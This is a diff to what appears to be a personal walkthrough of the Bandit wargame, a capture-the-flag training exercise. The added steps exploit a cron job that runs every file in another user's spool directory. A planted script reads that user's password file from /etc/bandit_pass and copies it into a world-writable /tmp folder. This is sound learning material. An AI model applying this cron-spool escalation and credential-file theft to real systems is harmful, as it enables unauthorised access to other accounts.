@@ -540,10 +540,15 @@ do
     if [ "$i" != "." -a "$i" != ".." ];
     then
         echo "Handling $i"
-        # execute script for 60 seconds then kill it
+        # execute script for 60 seconds then end with signal SIGKILL (aka 9)
         timeout -s 9 60 ./$i
+        # remove file forcefully
         rm -f ./$i
     fi
 done
 ```
+
+1. Bandit24's account has a cron job that executes all files within /var/spool/bandit24 and then deletes the file. So what needs to be done is create a script that, when bandit24 runs it, it will copy bandit24's password file into a specified location that we, bandit23, can access. First create your own folder in /tmp to store your own script.  `mkdir /tmp/tokumei` `chmod 777 /tmp/tokumei` to allow bandit24 access
+2. Write your own script using vim and save it in that directory and also change permission on it. `#!/bin/bash cat /etc/bandit_pass/bandit24 >> /tmp/tokumei/key`  The script, named copy.sh, will output bandit24 password to  a file called key and append if it exists. {%hint style="warning"%} I tried using /etc/bandit\_pass/$\(whoami\) in the scipt but it did not work. Have not figured out why. {%endhint%}
+3. Copy copy.sh to bandit24's folder of cronjobs and wait for at least 1 minute and a key file will appear in tokumei's folder. `chmod 777 copy.sh  #change permission access cp copy.sh /var/spool/bandit24/ ls -l /var/spool/bandit24/copy  #to verify if copied`
 
